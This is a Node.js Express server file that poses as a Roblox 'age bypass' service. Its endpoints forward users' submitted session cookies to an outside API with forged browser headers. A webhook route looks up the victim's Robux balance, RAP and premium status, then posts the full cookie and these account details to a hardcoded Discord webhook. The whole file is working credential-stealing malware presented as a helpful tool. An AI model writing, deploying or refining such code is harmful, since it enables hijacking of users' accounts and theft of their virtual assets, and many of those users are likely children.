const express = require('express');
const axios = require('axios');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());

const API_BASE_URL = 'https://rblxbypasser.com/api';
const WEBSITE_URL = 'https://rblxbypasser.com/'; // The URL of their website

// --- This is the key to making it work ---
const FORGED_HEADERS = {
    'Referer': WEBSITE_URL,
    'Origin': WEBSITE_URL,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
};

// --- Endpoint 1: Starts the bypass process (Now with forged headers) ---
app.post('/api/bypass', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ success: false, message: "Cookie is required." });
    }
    try {
        // We forward the request, but with the forged headers to look legitimate
        const response = await axios.post(`${API_BASE_URL}/bypass`, { cookie }, {
            headers: FORGED_HEADERS
        });
        res.status(200).json(response.data);
    } catch (error) {
        const status = error.response?.status || 500;
        const message = error.response?.data?.message || "Failed to initiate bypass. The external API may be down or blocking requests.";
        res.status(status).json({ success: false, message });
    }
});

// --- Endpoint 2: Polls for progress (Now with forged headers) ---
app.get('/api/progress', async (req, res) => {
    const { token } = req.query;
    if (!token) {
        return res.status(400).json({ success: false, message: "Token is required." });
    }
    try {
        // We also forge headers here for consistency
        const response = await axios.get(`${API_BASE_URL}/progress?token=${token}`, {
            headers: FORGED_HEADERS
        });
        res.status(200).json(response.data);
    } catch (error) {
        const status = error.response?.status || 500;
        const message = error.response?.data?.message || "Failed to get progress.";
        res.status(status).json({ success: false, message });
    }
});

// --- Endpoint 3: Webhook Logic (No changes needed here) ---
app.post('/api/webhook', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie) {
        return res.status(200).send("Webhook ignored: No cookie provided.");
    }
    const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
    try {
        const robloxUser = await RobloxUser.register(cookie);
        const userData = await robloxUser.getUserData();
        const format = (num) => new Intl.NumberFormat('en-US').format(num);
        const embed = {
            color: 0x43afff,
            author: { name: `${userData.displayName} (@${userData.username}) - Age Bypassed`, url: `https://www.roblox.com/users/${userData.uid}/profile` },
            thumbnail: { url: userData.avatarUrl },
            fields: [
                { name: '💰 Robux', value: `\`${format(userData.balance)}\``, inline: true },
                { name: '📈 RAP', value: `\`${format(userData.rap)}\``, inline: true },
                { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true },
                { name: '🍪 Cookie Used', value: `\`\`\`${cookie}\`\`\``, inline: false },
            ],
            footer: { text: "Roblox Age Bypasser • Success" },
            timestamp: new Date().toISOString()
        };
        await axios.post(webhookURL, { embeds: [embed] });
        res.status(200).send("Webhook sent successfully.");
    } catch (error) {
        console.error("WEBHOOK TASK FAILED:", error.message);
        res.status(200).send("Webhook task failed on server.");
    }
});

module.exports = app;
